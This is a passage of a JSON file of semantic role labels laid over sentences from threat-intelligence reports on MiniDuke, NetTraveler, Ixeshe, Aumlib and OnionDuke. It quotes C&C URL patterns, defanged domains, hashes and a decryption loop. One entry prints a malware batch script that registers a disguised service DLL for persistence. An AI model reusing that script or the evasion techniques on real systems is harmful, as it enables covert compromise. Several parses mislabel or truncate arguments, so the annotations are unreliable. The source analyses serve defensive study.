"V": {"text": "is", "index": 3}, "ARG2": {"text": "that it is impossible to retrieve the configuration of an encrypted payload if analyzing it on a different computer"}}, "is_2": {"V": {"text": "is", "index": 6}, "ARG2": {"text": "impossible"}, "ARG1": {"text": "to retrieve the configuration of an encrypted payload if analyzing it on a different computer"}}, "retrieve": {"V": {"text": "retrieve", "index": 9}, "ARG1": {"text": "the configuration of an encrypted payload"}, "ARGM-ADV": {"text": "if analyzing it on a different computer"}}, "encrypted": {"V": {"text": "encrypted", "index": 14}, "ARG1": {"text": "payload"}}, "analyzing": {"V": {"text": "analyzing", "index": 17}, "ARG1": {"text": "it"}, "ARGM-MNR": {"text": "on a different computer"}}}, "\n\nAn interesting thing about the shellcode is that before transferring control to any API function it checks\nthe first bytes of the function in order to detect hooks and debugger breakpoints which may be set by\nsecurity software and monitoring tools": {"is": {"ARG1": {"text": "An interesting thing about the shellcode"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "that before transferring control to any API function it checks the first bytes of the function in order to detect hooks and debugger breakpoints which may be set by security software and monitoring tools"}}, "transferring": {"V": {"text": "transferring", "index": 9}, "ARG1": {"text": "control"}, "ARG3": {"text": "to any API function"}}, "checks": {"ARGM-TMP": {"text": "before transferring control to any API function"}, "ARG0": {"text": "it"}, "V": {"text": "checks", "index": 16}, "ARG1": {"text": "the first bytes of the function"}, "ARGM-PRP": {"text": "in order to detect hooks and debugger breakpoints which may be set by security software and monitoring tools"}}, "detect": {"V": {"text": "detect", "index": 26}, "ARG1": {"text": "hooks and debugger breakpoints which may be set by security software and"}}, "may": {}, "be": {"V": {"text": "be", "index": 33}}, "set": {"ARG1": {"text": "debugger breakpoints"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "set", "index": 34}, "ARG0": {"text": "by security software"}}}, " If either of those conditions is met the malware assumes it is run for the\nfirst time and it proceeds with its installation onto the system": {"is": {"V": {"text": "is", "index": 5}}, "met": {"ARG1": {"text": "either of those conditions"}, "V": {"text": "met", "index": 6}}, "assumes": {"ARG0": {"text": "the malware"}, "V": {"text": "assumes", "index": 9}, "ARG1": {"text": "it is run for the first time"}}, "is_2": {"V": {"text": "is", "index": 11}}, "run": {"ARG1": {"text": "it"}, "V": {"text": "run", "index": 12}, "ARGM-TMP": {"text": "for the first time"}}, "proceeds": {"ARG0": {"text": "it"}, "V": {"text": "proceeds", "index": 19}, "ARGM-MNR": {"text": "with its installation"}, "ARG1": {"text": "onto the system"}}}, " The final\nURL used to communicate with the C&C server looks like this: <url_start>/create.php?<rnd_param>=\n<system_info> Those tokens are derived as follows:\n<list>\n      url_start \u2013 the URL retrieved from the twitter account\n      rnd_param \u2013 randomly generated of lower case alphabet characters parameter name in the query\n\f      string of the URL\n      system_info \u2013 base64 encoded and encrypted system information\n</list>\nAn example of such a URL is given below:\n<figure></figure>\n\nThe payload is downloaded in the file named \u201cfdbywu\u201d using the urlmon!URLDownloadToFileA API:\n\n<figure></figure>\n\n\nThe downloaded payload is a fake GIF8 file containing encrypted executable": {"used": {"V": {"text": "used", "index": 3}}, "communicate": {"ARG0": {"text": "The final URL"}, "V": {"text": "communicate", "index": 5}, "ARG2": {"text": "with the C&C server"}}, "looks": {"ARG0": {"text": "The final URL used to communicate with the C&C server"}, "V": {"text": "looks", "index": 10}, "ARG1": {"text": "like this"}}, "is": {"ARG1": {"text": "The downloaded payload"}, "V": {"text": "is", "index": 17}, "ARG2": {"text": "a fake GIF8 file containing encrypted executable"}}, "containing": {"ARG0": {"text": "a fake GIF8 file"}, "V": {"text": "containing", "index": 22}, "ARG1": {"text": "encrypted executable"}}, "encrypted": {"V": {"text": "encrypted", "index": 23}, "ARG1": {"text": "executable"}}}, " MiniDuke gathers information about the\nsystem and encrypts its configuration based on that information, a method also used by OSX/Flashback\n(this process is called watermarking by Bitdefender)": {"encrypts": {"ARG0": {"text": "MiniDuke"}, "V": {"text": "encrypts", "index": 7}, "ARG1": {"text": "its configuration"}, "ARGM-MNR": {"text": "based on that information"}}, "based": {"ARG1": {"text": "encrypts"}, "V": {"text": "based", "index": 10}, "ARG2": {"text": "on that information"}}, "used": {"ARG1": {"text": "a method"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "used", "index": 18}, "ARG0": {"text": "by OSX / Flashback ("}}, "is": {"V": {"text": "is", "index": 26}}, "called": {"ARG1": {"text": "this process"}, "V": {"text": "called", "index": 27}, "ARG2": {"text": "watermarking by Bitdefender )"}}, "watermarking": {"V": {"text": "watermarking", "index": 28}, "ARG0": {"text": "by Bitdefender )"}}}, "\n\n<figure></figure>\n\n\nThis file is then stored in an Alternate Data Stream (ADS) in NTUSER.DAT in the %USERPROFILE%\nfolder": {"is": {"V": {"text": "is", "index": 2}}, "stored": {"ARG1": {"text": "This file"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "stored", "index": 4}, "ARGM-LOC": {"text": "in an Alternate Data Stream ( ADS ) in NTUSER.DAT in the % USERPROFILE% folder"}}}, " This is probably done to\nthwart security systems that scan at the entry points of the JScript engine": {"is": {"V": {"text": "is", "index": 1}}, "done": {"ARG1": {"text": "This"}, "ARGM-ADV": {"text": "probably"}, "V": {"text": "done", "index": 3}, "ARGM-PRP": {"text": "to"}, "ARGM-GOL": {"text": "thwart security systems"}, "ARG4": {"text": "that scan at the entry points of the JScript engine"}}, "thwart": {"V": {"text": "thwart", "index": 5}, "ARG1": {"text": "security systems that scan at the entry points of the JScript engine"}}, "scan": {"ARG0": {"text": "thwart security systems"}, "R-ARG0": {"text": "that"}, "V": {"text": "scan", "index": 9}, "ARG2": {"text": "at the entry points of the JScript engine"}}}, " After decrypting itself and obtaining the addresses of some functions exported by\nkernel32.dll, it decrypts and drops the payload in the %TEMP% directory in a file named \u201ca.l\u201d which is\nsubsequently loaded by calling kernel32!LoadLibraryA": {"decrypting": {"V": {"text": "decrypting", "index": 1}, "ARG1": {"text": "itself"}}, "obtaining": {"ARG0": {"text": "decrypting"}, "V": {"text": "obtaining", "index": 4}, "ARG1": {"text": "the addresses of some functions exported by kernel32.dll"}}, "exported": {"ARG1": {"text": "some functions"}, "V": {"text": "exported", "index": 10}, "ARG0": {"text": "by kernel32.dll"}}, "decrypts": {"ARGM-TMP": {"text": "After decrypting itself and obtaining the addresses of some functions exported by kernel32.dll"}, "ARG0": {"text": "it"}, "V": {"text": "decrypts", "index": 15}, "ARG1": {"text": "the payload directory"}, "ARGM-LOC": {"text": "in the % TEMP%/ in a file named \u201c a.l \u201d which is subsequently loaded by calling kernel32!LoadLibraryA"}}, "drops": {"ARGM-TMP": {"text": "After decrypting itself and obtaining the addresses of some functions exported by kernel32.dll"}, "ARG0": {"text": "it"}, "V": {"text": "drops", "index": 17}, "ARG1": {"text": "the payload"}, "ARGM-LOC": {"text": "in the % TEMP% directory/ in a file named \u201c a.l \u201d which is subsequently loaded by calling kernel32!LoadLibraryA"}}, "named": {"ARG1": {"text": "a file"}, "V": {"text": "named", "index": 28}, "ARG2": {"text": "\u201c a.l \u201d"}}, "is": {"V": {"text": "is", "index": 33}}, "loaded": {"ARG1": {"text": "a file named \u201c a.l \u201d"}, "R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "subsequently"}, "V": {"text": "loaded", "index": 35}, "ARG2": {"text": "by calling kernel32!LoadLibraryA"}}, "calling": {"V": {"text": "calling", "index": 37}, "ARG1": {"text": "kernel32!LoadLibraryA"}}}, " The RSA-2048 public key to verify\nintegrity of the executable inside the GIF file is the same as in the previous version of MiniDuke": {"verify": {"V": {"text": "verify", "index": 5}, "ARG1": {"text": "integrity of the executable inside the GIF file"}}, "is": {"ARG1": {"text": "The RSA-2048 public key to verify integrity of the executable inside the GIF file"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "the same as in the previous version of MiniDuke"}}}, " Although\nthe backdoor is still quite similar to its previous versions, some important changes were made since last\nyear, the most notable being the introduction of a secondary component written in JScript to contact a\nC&C server via Twitter": {"is": {"ARG1": {"text": "the backdoor"}, "V": {"text": "is", "index": 3}, "ARGM-TMP": {"text": "still"}, "ARG2": {"text": "quite similar to its previous versions"}}, "were": {"V": {"text": "were", "index": 15}}, "made": {"ARGM-ADV": {"text": "Although the backdoor is still quite similar to its previous versions/ the most notable being the introduction of a secondary component written in JScript to contact a C&C server via Twitter"}, "ARG1": {"text": "some important changes"}, "V": {"text": "made", "index": 16}, "ARGM-TMP": {"text": "since last year"}}, "being": {"ARG1": {"text": "the most notable"}, "V": {"text": "being", "index": 24}, "ARG2": {"text": "the introduction of a secondary component written in JScript to contact a C&C server via Twitter"}}, "written": {"ARG1": {"text": "a secondary component"}, "V": {"text": "written", "index": 31}, "ARGM-LOC": {"text": "in JScript"}, "ARGM-PRP": {"text": "to contact a C&C server via Twitter"}}, "contact": {"V": {"text": "contact", "index": 35}, "ARG1": {"text": "a C&C server"}, "ARGM-MNR": {"text": "via Twitter"}}}, " Other known mutexes used by older and current variants include:\n<list>\n Boat-12 Is Running!\n DocHunter2012 Is Running!\n Hunter-2012 Is Running!\n NT-2012 Is Running!\n\f      NetTravler Is Running!\n      NetTravler2012 Is Running!\n      SH-2011 Is Running!\n      ShengHai Is Running!\n      SD2013 is Running!\n</list>\nThe malware configuration file is written to the \"SYSTEM\" folder (as opposed to SYSTEM32) and has a\nslightly new format compared to \"older\" NetTraveler samples:\n\n\n<figure></figure>\n\nFor the record, here's what an older NetTraveler config file looks like:\n\n<figure></figure>\n\n\nObviously, the developers behind NetTraveler have taken steps to try to hide the malware's configuration": {"known": {"V": {"text": "known", "index": 1}, "ARG1": {"text": "mutexes"}}, "used": {"ARG1": {"text": "Other known mutexes"}, "V": {"text": "used", "index": 3}, "ARG0": {"text": "by older and current variants"}}, "include": {"ARG2": {"text": "Other known mutexes used by older and current variants"}, "V": {"text": "include", "index": 9}, "ARGM-ADV": {"text": "Obviously"}, "ARG1": {"text": "the developers behind NetTraveler have taken steps to try to hide the malware 's configuration"}}, "have": {"V": {"text": "have", "index": 17}}, "taken": {"ARGM-ADV": {"text": "Obviously"}, "ARG0": {"text": "the developers behind NetTraveler"}, "V": {"text": "taken", "index": 18}, "ARG1": {"text": "steps"}, "ARGM-PRP": {"text": "to try to hide the malware 's configuration"}}, "try": {"ARG0": {"text": "steps"}, "V": {"text": "try", "index": 21}, "ARG1": {"text": "to hide the malware 's configuration"}}, "hide": {"ARG0": {"text": "steps"}, "V": {"text": "hide", "index": 23}, "ARG1": {"text": "the malware 's configuration"}}}, "\n\nIf run on a vulnerable version of Microsoft Office, it drops the main module as \"net.exe\" (detected by\nKaspersky Lab products as Trojan-Dropper.Win32.Agent.lifr), which in turn installs a number of\nother files": {"drops": {"ARGM-ADV": {"text": "If run on a vulnerable version of Microsoft Office"}, "ARG0": {"text": "it"}, "V": {"text": "drops", "index": 11}, "ARG1": {"text": "the main module as \" net.exe \" ( detected by Kaspersky Lab products as Trojan - Dropper . Win32.Agent.lifr ) , which in turn installs a number of other files"}}, "detected": {"ARG1": {"text": "\" net.exe \" ("}, "V": {"text": "detected", "index": 20}, "ARG0": {"text": "by Kaspersky Lab products"}, "ARGM-PRD": {"text": "as Trojan - Dropper"}}, "installs": {"ARG0": {"text": "Win32.Agent.lifr )"}, "R-ARG0": {"text": "which"}, "ARGM-DIS": {"text": "in turn"}, "V": {"text": "installs", "index": 36}, "ARG1": {"text": "a number of other files"}}}, "\n\nThe algorithm is as follows:\n<code>\nfor (i=0;i<string_size;i++)\ndecrypted[i]=encrypted[i] - (i + 0xa);\n</code>\nOnce decrypted, the new config looks like this:\n\n<figure></figure>\n\fOne can easily see the command-and-control (C&C) server in the screenshot above, which is\n\"uyghurinfo[.]com\"": {"is": {"ARG1": {"text": "The algorithm"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "as follows"}}, "follows": {"V": {"text": "follows", "index": 4}}, "can": {"V": {"text": "can", "index": 7}}, "see": {"ARG0": {"text": "One"}, "ARGM-MOD": {"text": "can"}, "ARGM-MNR": {"text": "easily"}, "V": {"text": "see", "index": 9}, "ARG1": {"text": "the command - and - control ( C&C ) server"}, "ARGM-LOC": {"text": "in the screenshot above ,"}, "C-ARG1": {"text": "which is \" uyghurinfo[.]com"}}, "is_2": {"ARG1": {"text": "the command - and - control ( C&C ) server in the screenshot above"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 26}, "ARG2": {"text": "uyghurinfo[.]com \""}}}, "\n\nHere's an example of a targeted spear-phishing e-mail directed at Uyghur activists in March 2014": {"'s": {"ARG2": {"text": "Here"}, "V": {"text": "'s", "index": 1}, "ARG1": {"text": "an example of a targeted spear - phishing e - mail directed at Uyghur activists in March 2014"}}, "targeted": {"V": {"text": "targeted", "index": 6}, "ARG1": {"text": "spear - phishing"}}, "phishing": {"ARG1": {"text": "spear"}, "V": {"text": "phishing", "index": 9}}, "directed": {"ARG1": {"text": "a targeted spear - phishing e - mail"}, "V": {"text": "directed", "index": 13}, "ARG2": {"text": "at Uyghur activists"}, "ARGM-TMP": {"text": "in March 2014"}}}, "\n\n\n<figure></figure>\n\nThe e-mail has two attachments, a non-malicious JPG file and a 373 KB Microsoft Word .DOC file": {"has": {"ARG0": {"text": "The e - mail"}, "V": {"text": "has", "index": 4}, "ARG1": {"text": "two attachments , a non - malicious JPG file and a 373 KB Microsoft Word .DOC file"}}}, "\n<table>\n           Name                      WINDOWSUPDATANEY.DLL\n           MD5                       c13c79ad874215cfec8d318468e3d116\n           Size                      37,888 bytes\n</table>\nIt is registered as a service (named \"Windowsupdata\") through a Windows Batch file named \"DOT.BAT\"\n(detected by Kaspersky Lab products as Trojan.BAT.Tiny.b):\n<figure>\n @echo off\n @reg add\n</figure>\n<figure>\n @echo off\n\n @reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v\n Windowsupdata /t REG_MULTI_SZ /d Windowsupdata /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v\n ImagePath /t REG_EXPAND_SZ /d %SystemRoot%\\System32\\svchost.exe -k Windowsupdata /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v\n DisplayName /t REG_SZ /d Windowsupdata /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v\n ObjectName /t REG_SZ /d LocalSystem /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v\n ErrorControl /t REG_DWORD /d 1 /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\" /v Start /t\n REG_DWORD /d 2 /f\n\n @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Windowsupdata\\Parameters\"\n /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\\system32\\Windowsupdataney.dll /f\n</figure>\nTo   make sure the malware isn't running multiple times, it uses the mutex \"SD_2013 Is Running!\" to mark\nits presence in the system": {"make": {"V": {"text": "make", "index": 1}, "ARG1": {"text": "sure the malware is n't running multiple times"}, "ARG0": {"text": "it"}}, "is": {"V": {"text": "is", "index": 5}}, "running": {"ARG0": {"text": "the malware"}, "ARGM-NEG": {"text": "n't"}, "V": {"text": "running", "index": 7}, "ARGM-TMP": {"text": "multiple times"}}, "uses": {"R-ARG0": {"text": "To make sure the malware is n't running multiple times"}, "ARG0": {"text": "it"}, "V": {"text": "uses", "index": 12}, "ARG1": {"text": "the mutex \" SD_2013 Is Running"}, "ARG2": {"text": "to mark its presence in the system"}}, "Is": {"V": {"text": "Is", "index": 17}}, "Running": {"ARG1": {"text": "SD_2013"}, "V": {"text": "Running", "index": 18}}, "mark": {"V": {"text": "mark", "index": 22}, "ARG1": {"text": "its presence in the system"}}}, " The main C&C module is dumped into\n\"%SystemRoot%\\system32\\Windowsupdataney.dll\", (detected by Kaspersky as Trojan-\nSpy.Win32.TravNet.qfr)": {"is": {"V": {"text": "is", "index": 4}}, "dumped": {"ARG1": {"text": "The main C&C module"}, "V": {"text": "dumped", "index": 5}, "ARGM-DIR": {"text": "into \" % SystemRoot%\\system32\\Windowsupdataney.dll \""}, "ARGM-ADV": {"text": "( detected by Kaspersky as Trojan- Spy . Win32.TravNet.qfr )"}}, "detected": {"ARG1": {"text": "The main C&C module"}, "V": {"text": "detected", "index": 13}, "ARG0": {"text": "by Kaspersky"}, "ARGM-PRD": {"text": "as Trojan- Spy . Win32.TravNet.qfr )"}}}, "\n\n<figure></figure>\n\n\nThe Base64-encoded data still contains information including the victim\u2019s hostname and IP address but\nalso a \u201cmark\u201d or \u201ccampaign tag/code\u201d that the threat actors use to keep track of their various attacks": {"Base64-encoded": {"V": {"text": "Base64-encoded", "index": 1}, "ARG1": {"text": "data"}}, "contains": {"ARG0": {"text": "The Base64-encoded data"}, "ARGM-TMP": {"text": "still"}, "V": {"text": "contains", "index": 4}, "ARG1": {"text": "information including the victim \u2019s hostname and IP address but also a \u201c mark \u201d or \u201c campaign tag / code \u201d that the threat actors use to keep track of their various attacks"}}, "including": {"ARG2": {"text": "information"}, "V": {"text": "including", "index": 6}, "ARG1": {"text": "the victim \u2019s hostname and IP address but also a \u201c mark \u201d or \u201c campaign tag / code"}}, "use": {"ARG1": {"text": "that"}, "ARG0": {"text": "the threat actors"}, "V": {"text": "use", "index": 31}, "ARG2": {"text": "to keep track of their various attacks"}}, "keep": {"ARG0": {"text": "the threat actors"}, "V": {"text": "keep", "index": 33}, "ARG1": {"text": "track of their various attacks"}}}, "\n\f\n\n<figure></figure>\n\nThis sample (aa873ed803ca800ce92a39d9a683c644) exhibited network traffic that does not match the\nearlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe\nrelated infections": {"exhibited": {"ARG0": {"text": "This sample ( aa873ed803ca800ce92a39d9a683c644 )"}, "V": {"text": "exhibited", "index": 5}, "ARG1": {"text": "network traffic that does not match the earlier pattern"}}, "does": {"V": {"text": "does", "index": 9}}, "match": {"ARG0": {"text": "network traffic"}, "R-ARG0": {"text": "that"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "match", "index": 11}, "ARG1": {"text": "the earlier pattern"}}, "may": {"ARGM-ADV": {"text": "therefore"}, "V": {"text": "may", "index": 17}}, "evade": {"ARG0": {"text": "network traffic"}, "R-ARG0": {"text": "that"}, "ARGM-ADV": {"text": "therefore"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "evade", "index": 18}, "ARG1": {"text": "existing network traffic signatures designed to detect Ixeshe related infections"}}, "existing": {"V": {"text": "existing", "index": 19}, "ARG1": {"text": "network traffic signatures"}}, "designed": {"ARG1": {"text": "existing network traffic signatures"}, "V": {"text": "designed", "index": 23}, "ARG3": {"text": "to detect Ixeshe related infections"}}, "detect": {"V": {"text": "detect", "index": 25}, "ARG1": {"text": "Ixeshe related infections"}}}, " Older variants of this malware family generated the\nfollowing POST request:\n<list>\nPOST /bbs/info.asp HTTP/1.1\n</list>\nData sent via this POST request transmitted in clear text in the following structure:\n<list>\n<VICTIM BIOS NAME>|<CAMPAIGN ID>|<VICTIM EXTERNAL IP>|<VICTIM OS>|\n</list>\nA recently observed malware sample (hash value 832f5e01be536da71d5b3f7e41938cfb) appears to be a\nmodified variant of Aumlib": {"generated": {"ARG0": {"text": "Older variants of this malware family"}, "V": {"text": "generated", "index": 6}, "ARG1": {"text": "the following POST request"}}, "following": {"V": {"text": "following", "index": 8}, "ARG1": {"text": "POST request"}}, "observed": {"ARGM-TMP": {"text": "recently"}, "V": {"text": "observed", "index": 14}, "ARG1": {"text": "malware"}}, "appears": {"ARG1": {"text": "A recently observed malware sample ( hash value 832f5e01be536da71d5b3f7e41938cfb )/ to be a modified variant of Aumlib"}, "V": {"text": "appears", "index": 22}}, "be": {"ARG1": {"text": "A recently observed malware sample ( hash value 832f5e01be536da71d5b3f7e41938cfb )"}, "V": {"text": "be", "index": 24}, "ARG2": {"text": "a modified variant of Aumlib"}}, "modified": {"V": {"text": "modified", "index": 26}, "ARG1": {"text": "variant"}}}, "\n\nAnd a new version of Ixeshe, which has been in service since 2009 to attack targets in East Asia, uses new\nnetwork traffic patterns, possibly to evade traditional network security systems": {"has": {"V": {"text": "has", "index": 8}}, "been": {"ARG1": {"text": "Ixeshe"}, "R-ARG1": {"text": "which"}, "V": {"text": "been", "index": 9}, "ARG2": {"text": "in service"}, "ARGM-TMP": {"text": "since 2009 to attack targets in East Asia"}}, "attack": {"ARG0": {"text": "which"}, "V": {"text": "attack", "index": 15}, "ARG1": {"text": "targets in East Asia"}}, "uses": {"ARGM-DIS": {"text": "And"}, "ARG0": {"text": "a new version of Ixeshe , which has been in service since 2009 to attack targets in East Asia ,"}, "V": {"text": "uses", "index": 21}, "ARG1": {"text": "new network traffic patterns"}, "ARG2": {"text": "possibly to evade traditional network security systems"}}, "evade": {"ARG0": {"text": "a new version of Ixeshe , which has been in service since 2009 to attack targets in East Asia"}, "ARGM-ADV": {"text": "possibly"}, "V": {"text": "evade", "index": 29}, "ARG1": {"text": "traditional network security systems"}}}, "\n\nAumlib, which for years has been used in targeted attacks, now encodes certain HTTP communications": {"has": {"V": {"text": "has", "index": 5}}, "been": {"V": {"text": "been", "index": 6}}, "used": {"ARG1": {"text": "Aumlib"}, "R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "for years"}, "V": {"text": "used", "index": 7}, "ARG2": {"text": "in targeted attacks"}}, "targeted": {"V": {"text": "targeted", "index": 9}, "ARG1": {"text": "attacks"}}, "encodes": {"ARG0": {"text": "Aumlib , which for years has been used in targeted attacks"}, "ARGM-TMP": {"text": "now"}, "V": {"text": "encodes", "index": 13}, "ARG1": {"text": "certain HTTP communications"}}}, " The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to\ndocuments[.]myPicture[.]info and www[.]documents[.]myPicture[.]info and as expected generated the a\nPOST request to /bbs/info.asp": {"connected": {"V": {"text": "connected", "index": 3}, "ARG2": {"text": "to documents[.]myPicture[.]info"}}, "expected": {"V": {"text": "expected", "index": 10}, "ARG1": {"text": "generated the a POST request"}}, "generated": {"V": {"text": "generated", "index": 11}, "ARG1": {"text": "the a POST request to /bbs / info.asp"}}}, " About four months after The New York Times\npublicized an attack on its network, the attackers behind the intrusion deployed updated versions of their\nBackdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families <fn>[2]</fn>": {"publicized": {"ARG0": {"text": "The New York Times"}, "V": {"text": "publicized", "index": 8}, "ARG1": {"text": "an attack on its network"}}, "deployed": {"ARGM-TMP": {"text": "About four months after The New York Times publicized an attack on its network"}, "ARG0": {"text": "the attackers behind the"}, "V": {"text": "deployed", "index": 20}, "ARG1": {"text": "updated versions"}}, "updated": {"ARGM-TMP": {"text": "About four months after The New York Times publicized an attack on its network"}, "V": {"text": "updated", "index": 21}, "ARG1": {"text": "versions"}}}, "\n\nThe sample, which was deployed against an organization involved in shaping economic policy, was\ndownloaded from the following URL:\n<list>\nstatus[.]acmetoy[.]com/DD/myScript.js or status[.]acmetoy[.]com/DD/css.css\n</list>\nThe sample generated the following traffic:\n\n<figure></figure>\n\nThis output reveals the following changes when compared with earlier variants:\n\n      The POST URI is changed to /bbs/search.asp (as mentioned, earlier Aumlib variants used a POST\n\f      URI of /bbs/info.asp.)\n      The POST body is now encoded": {"was": {"V": {"text": "was", "index": 4}}, "deployed": {"ARG1": {"text": "The sample"}, "R-ARG1": {"text": "which"}, "V": {"text": "deployed", "index": 5}, "ARGM-MNR": {"text": "against an organization involved in shaping economic policy"}}, "involved": {"ARG1": {"text": "an organization"}, "V": {"text": "involved", "index": 9}, "ARG2": {"text": "in shaping economic policy"}}, "shaping": {"V": {"text": "shaping", "index": 11}, "ARG1": {"text": "economic policy"}}, "was_2": {"V": {"text": "was", "index": 15}}, "downloaded": {"ARG1": {"text": "The sample , which was deployed against an organization involved in shaping economic policy ,"}, "V": {"text": "downloaded", "index": 16}, "ARG2": {"text": "from the following URL"}}, "following": {"V": {"text": "following", "index": 19}, "ARG1": {"text": "URL"}}, "reveals": {"ARG0": {"text": "This output"}, "V": {"text": "reveals", "index": 24}, "ARG1": {"text": "the following changes"}, "ARGM-TMP": {"text": "when compared with earlier variants"}}, "following_2": {"V": {"text": "following", "index": 26}, "ARG1": {"text": "changes"}}, "compared": {"ARGM-TMP": {"text": "when"}, "V": {"text": "compared", "index": 29}, "ARG2": {"text": "with earlier variants"}}, "is": {"V": {"text": "is", "index": 37}}, "changed": {"ARG1": {"text": "The POST URI"}, "V": {"text": "changed", "index": 38}, "ARG2": {"text": "to /bbs / search.asp ("}, "ARGM-ADV": {"text": "as mentioned"}}, "mentioned": {"V": {"text": "mentioned", "index": 45}}, "used": {"ARG0": {"text": "earlier Aumlib variants"}, "V": {"text": "used", "index": 50}, "ARG1": {"text": "a POST URI of /bbs / info.asp"}}, "is_2": {"V": {"text": "is", "index": 63}}, "encoded": {"ARG1": {"text": "The POST body"}, "ARGM-TMP": {"text": "now"}, "V": {"text": "encoded", "index": 65}}}, " Although the\nnetwork traffic is encoded with a custom Base64 alphabet, the URI pattern has been largely consistent:\n<list>\n/[ACD] [EW]S[Numbers].jsp?[Base64]\n</list>\nWe analyzed a recent sample that appears to have targeted entities in Taiwan, a target consistent with\nprevious Ixeshe activity": {"is": {"V": {"text": "is", "index": 4}}, "encoded": {"ARG1": {"text": "the network traffic"}, "V": {"text": "encoded", "index": 5}, "ARGM-MNR": {"text": "with a custom Base64 alphabet"}}, "has": {"V": {"text": "has", "index": 15}}, "been": {"ARGM-ADV": {"text": "Although the network traffic is encoded with a custom Base64 alphabet"}, "ARG1": {"text": "the URI pattern"}, "V": {"text": "been", "index": 16}, "ARG2": {"text": "largely consistent"}}, "analyzed": {"ARG0": {"text": "We"}, "V": {"text": "analyzed", "index": 21}, "ARG1": {"text": "a recent sample that appears to have targeted entities in Taiwan , a target consistent with previous Ixeshe activity"}}, "appears": {"V": {"text": "appears", "index": 26}, "ARG1": {"text": "to have targeted entities in Taiwan , a target consistent with previous Ixeshe activity"}}, "have": {"V": {"text": "have", "index": 28}}, "targeted": {"ARG0": {"text": "that"}, "V": {"text": "targeted", "index": 29}, "ARG1": {"text": "entities in Taiwan"}}}, "\n\f\n\n<figure></figure>\n<caption>A visualization of the infrastructure shared between OnionDuke and MiniDuke</caption>\n\n\nBased on compilation timestamps and discovery dates of samples we have observed, we believe the\nOnionDuke operators have been infecting downloaded executables at least since the end of October 2013": {"Based": {"V": {"text": "Based", "index": 0}, "ARG2": {"text": "on compilation timestamps and discovery dates of samples we have observed"}}, "have": {"V": {"text": "have", "index": 10}}, "observed": {"ARG1": {"text": "samples"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 11}}, "believe": {"ARGM-ADV": {"text": "Based on compilation timestamps and discovery dates of samples we have observed"}, "ARG0": {"text": "we"}, "V": {"text": "believe", "index": 14}, "ARG1": {"text": "the OnionDuke operators have been infecting downloaded executables at least since the end of October 2013"}}, "have_2": {"V": {"text": "have", "index": 18}}, "been": {"ARG1": {"text": "the OnionDuke operators"}, "V": {"text": "been", "index": 19}, "ARG2": {"text": "infecting downloaded executables"}, "ARGM-TMP": {"text": "at least since the end of October 2013"}}, "infecting": {"ARG0": {"text": "the OnionDuke operators"}, "V": {"text": "infecting", "index": 20}, "ARG1": {"text": "downloaded executables"}, "ARGM-TMP": {"text": "at least since the end of October 2013"}}, "downloaded": {"ARG0": {"text": "the OnionDuke operators"}, "V": {"text": "downloaded", "index": 21}, "ARG1": {"text": "executables"}}}, " Most of these components don't embed their own C&C information but\nrather communicate with their controllers through the original backdoor process": {"do": {"V": {"text": "do", "index": 4}}, "embed": {"ARG0": {"text": "Most of these components"}, "ARGM-NEG": {"text": "n't"}, "V": {"text": "embed", "index": 6}, "ARG1": {"text": "their own C&C information"}}, "communicate": {"ARG0": {"text": "Most of these components"}, "ARGM-NEG": {"text": "n't"}, "V": {"text": "communicate", "index": 13}, "ARG2": {"text": "with their controllers through the original backdoor process"}}}, "\nThis is significant because the domains leveldelta.com and grouptumbler.com have previously been\nidentified as C&C domains used by MiniDuke": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "significant"}, "ARGM-CAU": {"text": "because the domains leveldelta.com and grouptumbler.com have previously been identified as C&C domains used by MiniDuke"}}, "have": {"V": {"text": "have", "index": 9}}, "been": {"V": {"text": "been", "index": 11}}, "identified": {"ARG1": {"text": "the domains leveldelta.com and grouptumbler.com"}, "ARGM-TMP": {"text": "previously"}, "V": {"text": "identified", "index": 12}, "ARG2": {"text": "as C&C domains used by MiniDuke"}}, "used": {"ARG1": {"text": "C&C domains"}, "V": {"text": "used", "index": 16}, "ARG0": {"text": "by MiniDuke"}}}, " Some of these components have been observed\nbeing downloaded and executed by the original backdoor process but for other components, we have yet to\nidentify the infection vector": {"have": {"V": {"text": "have", "index": 4}}, "been": {"V": {"text": "been", "index": 5}}, "observed": {"V": {"text": "observed", "index": 6}, "ARG1": {"text": "being downloaded and executed by the original backdoor process"}}, "being": {"V": {"text": "being", "index": 7}}, "downloaded": {"ARG1": {"text": "Some of these components"}, "V": {"text": "downloaded", "index": 8}, "ARG0": {"text": "by the original backdoor process"}}, "executed": {"ARG1": {"text": "Some of these components"}, "V": {"text": "executed", "index": 10}, "ARG0": {"text": "by the original"}, "ARGM-ADV": {"text": "backdoor process"}}, "have_2": {"ARGM-ADV": {"text": "for other components"}, "V": {"text": "have", "index": 22}, "ARGM-TMP": {"text": "yet"}}, "identify": {"ARG0": {"text": "we"}, "V": {"text": "identify", 